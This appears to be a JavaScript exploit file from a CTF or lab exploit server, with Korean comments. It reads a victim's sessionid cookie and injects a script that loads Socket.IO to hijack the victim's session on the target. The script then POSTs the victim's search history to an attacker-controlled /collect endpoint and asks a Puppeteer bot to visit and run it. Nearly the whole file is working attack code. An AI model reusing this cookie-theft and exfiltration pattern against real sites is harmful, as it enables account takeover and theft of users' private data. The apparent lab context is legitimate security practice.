// exploit/exploit.js

document.addEventListener("DOMContentLoaded", () => {
    const exploitBody = document.getElementById("exploitBody");
    const exploitForm = document.getElementById("exploitForm");
    const logsBtn = document.getElementById("logsBtn");
    const homeBtn = document.getElementById("homeBtn");
    const protocol = window.location.protocol;
    const host = window.location.hostname;
    const logsPort = 777;
    const mainServerUrl = `http://localhost:727`;
    const collectUrl = `http://localhost:777/collect`;

    // ----------------- 기존 익스플로잇 폼 동작 ----------------- //
    // 이 부분은 그대로 둡니다.
    exploitForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        const payload = exploitBody.value.trim();
        if (!payload) return;

        try {
            await fetch(`${mainServerUrl}/deliver`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                mode: "cors",
                body: JSON.stringify({ payload })
            });
        } catch (err) {
            console.error("Error delivering exploit:", err);
        }
    });

    if (logsBtn) {
        logsBtn.addEventListener("click", () => {
            const logsUrl = `${protocol}//${host}:${logsPort}/logs`;
            window.open(logsUrl, "_blank");
        });
    }

    if (homeBtn) {
        homeBtn.addEventListener("click", () => {
            window.location.href = `${mainServerUrl}/`;
        });
    }

    // ----------------- 수정된 공격 로직 ----------------- //
    // 기존의 잘못된 Socket.IO 연결 코드를 삭제하고,
    // 피해자의 쿠키를 탈취하여 Puppeteer를 실행하는 로직을 추가합니다.

    // 피해자의 쿠키에서 sessionid를 가져오는 함수
    function getSessionId() {
        const match = document.cookie.match(/sessionid=([^;]+)/);
        return match ? match[1] : null;
    }

    const sessionid = getSessionId();

    if (sessionid) {
        console.log(`[Exploit] Session ID found: ${sessionid}`);
    } else {
        console.log(`[Exploit] No session ID found.`);
    }

    // Puppeteer가 실행할 공격 스크립트를 정의합니다.
    // 이 스크립트는 Puppeteer가 방문한 페이지(피해자 페이지)에서 실행됩니다.
    const exploitScript = `
        (function() {
            const collectUrl = "http://localhost:777/collect";
            const sessionid = "${sessionid}";

            // Socket.IO 클라이언트가 로드되었는지 확인하고 없으면 동적으로 로드
            function setupSocket() {
                if (typeof io === 'undefined') {
                    const script = document.createElement("script");
                    script.src = "https://cdn.socket.io/4.6.1/socket.io.min.js";
                    script.onload = () => connectAndExploit();
                    document.head.appendChild(script);
                } else {
                    connectAndExploit();
                }
            }

            function connectAndExploit() {
                const mainServerUrl = "http://localhost:727";
                const socket = io(mainServerUrl, {
                    transports: ["websocket"]
                });

                socket.on("connect", () => {
                    if (sessionid) {
                        socket.emit("READY", { sessionid: sessionid });
                    }
                });

                socket.on("search_history", (data) => {
                    const msg = JSON.stringify(data);
                    fetch(collectUrl, {
                        method: "POST",
                        mode: "no-cors",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ msg, sessionid })
                    });
                });
            }

            setupSocket();
        })();
    `;

    // 익스플로잇 서버에 Puppeteer 실행을 요청합니다.
    fetch("http://localhost:777/visit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        mode: "cors",
        body: JSON.stringify({
            exploitScript: exploitScript,
            sessionid: sessionid
        })
    }).catch(err => console.error("Error requesting Puppeteer visit:", err));

});